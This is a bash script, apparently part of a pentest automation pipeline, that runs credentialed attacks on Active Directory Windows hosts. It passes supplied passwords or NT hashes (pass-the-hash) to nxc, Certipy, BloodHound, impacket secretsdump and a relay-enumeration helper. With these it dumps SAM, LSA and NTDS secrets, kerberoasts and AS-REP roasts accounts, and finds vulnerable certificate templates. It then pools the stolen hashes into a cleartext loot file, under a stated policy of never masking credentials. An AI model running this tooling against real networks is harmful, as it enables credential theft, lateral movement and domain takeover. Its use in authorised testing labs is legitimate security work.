#!/usr/bin/env bash
# Credentialed AD enum against the ALREADY-FOUND windows hosts (00-discovery/windows-hosts.txt).
# Manual, off the auto DAG -- run it whenever you get a credential, including from a LATER run:
#   make ad-auth CREDS=user:pass SCOPE=<scope> RUN=<prior-run>   # reuses that run's found windows hosts
#   make ad-auth CREDS='DOMAIN/user:pass' RUN=... DC=192.168.56.10
#   make ad-auth CREDS=user:<NThash> RUN=...                     # pass-the-hash (32-hex secret)
#   make ad-auth CREDS=user:pass WINHOSTS=/path/to/hosts.txt     # explicit host list
# LOOT POLICY: credentials, NT hashes, and Kerberos tickets stay CLEARTEXT everywhere (terminal,
# scan.log, output files). It is engagement loot the team copy-pastes for lateral movement; never mask it.
set -euo pipefail
OUT="${1:?output dir}"; CREDS="${2:?user:pass}"; STAGE="20 ad/authed"
. "$(dirname "$0")/_lib.sh"
d="$OUT/20-ad"; mkdir -p "$d/raw"
# Reuse the windows hosts discovery already found (override with WINHOSTS=).
wh="${WINHOSTS:-$OUT/00-discovery/windows-hosts.txt}"

if [ ! -s "$wh" ]; then
  record ad-auth skipped 0 "no windows hosts (run discovery first, or pass RUN=<prior>/WINHOSTS=)"
  done_line "no windows hosts to authenticate against"
  exit 0
fi

# --- parse CREDS = [DOMAIN/]user:secret ; a 32-hex secret is an NT hash -> pass-the-hash ---
# Split on the FIRST colon first so a '/' in the password isn't mistaken for the DOMAIN/ separator.
cc="$CREDS"; cdom=""
up="${cc%%:*}"; secret="${cc#*:}"
case "$up" in */*) cdom="${up%%/*}"; up="${up#*/}";; esac
user="$up"
domain="${DOMAIN:-$cdom}"
[ -n "$domain" ] || domain=$(sed -n 's/.*(domain:\([^)]*\)).*/\1/p' "$OUT/00-discovery/raw/nxc-smb.txt" 2>/dev/null | head -1 || true)
dc="${DC:-$(head -1 "$wh")}"
if printf '%s' "$secret" | grep -qiE '^[a-f0-9]{32}$'; then AUTH=(-H "$secret"); akind="hash"; else AUTH=(-p "$secret"); akind="password"; fi
dopt=(); [ -n "$domain" ] && dopt=(-d "$domain")
nh=$(grep -vc '^[[:space:]]*$' "$wh" 2>/dev/null) || nh=0

banner "authed enum as ${domain:+$domain/}$user ($akind) · $nh host(s) · dc=$dc"

# 1) nxc SMB authenticated: access check, shares, users, pass policy, and SAM/LSA/NTDS where admin (loot)
if command -v nxc >/dev/null 2>&1; then
  capture "$d/raw/nxc-auth-smb.txt"  nxc smb "$wh" -u "$user" "${AUTH[@]}" "${dopt[@]}" --shares --users --pass-pol
  capture "$d/raw/nxc-auth-dump.txt" nxc smb "$wh" -u "$user" "${AUTH[@]}" "${dopt[@]}" --sam --lsa
  capture "$d/raw/nxc-auth-ntds.txt" nxc smb "$dc" -u "$user" "${AUTH[@]}" "${dopt[@]}" --ntds
  # kerberoast + asreproast via authenticated LDAP (hashes are loot to crack offline).
  # --dns-server "$dc": the container has no AD DNS, so kerberoasting's TGT fetch can't resolve the
  # realm KDC by name (port 88) and dies with "name resolution" -- point the resolver at the DC.
  capture "$d/raw/nxc-ldap.txt" nxc ldap "$dc" -u "$user" "${AUTH[@]}" "${dopt[@]}" --dns-server "$dc" \
      --kerberoasting "$d/raw/kerberoast.txt" --asreproast "$d/raw/asreproast.txt"
else
  record nxc skipped 0 "not installed"
fi

# 2) Certipy: AD CS vulnerable-template check (ESC1-ESC16) -- common GOAD/CPTC criticals
if command -v certipy >/dev/null 2>&1 && [ -n "$domain" ]; then
  if [ "$akind" = hash ]; then CPAUTH=(-hashes ":$secret"); else CPAUTH=(-p "$secret"); fi
  capture "$d/raw/certipy.txt" certipy find -u "${user}@${domain}" "${CPAUTH[@]}" -dc-ip "$dc" -vulnerable -stdout
else
  command -v certipy >/dev/null 2>&1 || record certipy skipped 0 "not installed"
fi

# 3) BloodHound collection (attack paths) -- the high-value AD output
if command -v bloodhound-ce-python >/dev/null 2>&1 && [ -n "$domain" ]; then
  if [ "$akind" = hash ]; then BHAUTH=(--hashes ":$secret"); else BHAUTH=(-p "$secret"); fi
  # BloodHound needs the DC as an FQDN (-dc) and a DNS server IP (-ns) to resolve the realm over TCP;
  # an IP in -dc is rejected outright. Derive the FQDN (name.domain from discovery) when dc is an IP.
  dcfqdn="$dc"; dcip="$dc"
  if printf '%s' "$dc" | grep -qE '^[0-9.]+$'; then
    dcname=$(awk -v ip="$dc" '$1=="SMB" && $2==ip {print $4; exit}' "$OUT/00-discovery/raw/nxc-smb.txt" 2>/dev/null || true)
    [ -n "${dcname:-}" ] && dcfqdn="${dcname}.${domain}"
  else
    dcip=$(head -1 "$wh")   # dc given as a hostname: use the first windows host IP as the resolver
  fi
  # Run from raw/ (bloodhound writes the zip to CWD) and judge by the ARTIFACT, not the exit code:
  # bloodhound returns 1 when the Kerberos TGT fails even though the NTLM fallback wrote a full zip.
  # Not wrapped in run() because run() keys status off the exit code; || true so it never aborts us.
  ( cd "$d/raw" && _tmo bloodhound-ce-python -u "$user" "${BHAUTH[@]}" -d "$domain" -dc "$dcfqdn" -ns "$dcip" --dns-tcp -c all --zip </dev/null 2>&1 | sed "s|^|[$STAGE] |" | tee -a "$LOG" ) || true
  if ls "$d"/raw/*_bloodhound.zip >/dev/null 2>&1; then
    z=$(ls -1t "$d"/raw/*_bloodhound.zip | head -1)
    record bloodhound-ce-python ok 0 "$(basename "$z")"; done_line "bloodhound collected · $(basename "$z")"
  else
    fail_banner "bloodhound-ce-python produced no zip"; record bloodhound-ce-python failed 1 "no zip produced"
  fi
else
  command -v bloodhound-ce-python >/dev/null 2>&1 || record bloodhound-ce-python skipped 0 "not installed"
fi

# 4) secretsdump (NTDS/SAM/LSA via impacket) -- the big loot dump when privileged
if command -v secretsdump.py >/dev/null 2>&1 && [ -n "$domain" ]; then
  if [ "$akind" = hash ]; then tgt="${domain}/${user}@${dc}"; SDAUTH=(-hashes ":$secret"); else tgt="${domain}/${user}:${secret}@${dc}"; SDAUTH=(); fi
  capture "$d/raw/secretsdump.txt" secretsdump.py "${SDAUTH[@]}" "$tgt"
else
  command -v secretsdump.py >/dev/null 2>&1 || record secretsdump.py skipped 0 "not installed"
fi

# 5) RelayKing: credentialed NTLM-relay opportunity enum across the windows hosts (RelayKing gates on a
# valid credential, so it lives here, not the unauth scan). Runs last; self-heals.
if [ "$akind" = hash ]; then _rkh=":$secret"; _rkp=""; else _rkp="$secret"; _rkh=""; fi
RK_USER="$user" RK_PASS="$_rkp" RK_HASH="$_rkh" RK_DOMAIN="$domain" RK_DC="$dc" \
  bash "$(dirname "$0")/relayking.sh" "$OUT" || true

# Collect all cleartext loot (dumped hashes, roastable hashes, LSA secrets) into one file.
: > "$d/loot.txt.tmp"
for f in nxc-auth-dump.txt nxc-auth-ntds.txt secretsdump.txt kerberoast.txt asreproast.txt; do
  [ -s "$d/raw/$f" ] && { echo "### $f"; cat "$d/raw/$f"; echo; } >> "$d/loot.txt.tmp"
done
mv "$d/loot.txt.tmp" "$d/loot.txt"
printf 'authed enum complete\n' > "$d/authed.done.tmp" && mv "$d/authed.done.tmp" "$d/authed.done"
done_line "authed enum done (as $user) · loot (cleartext) -> $d/loot.txt"
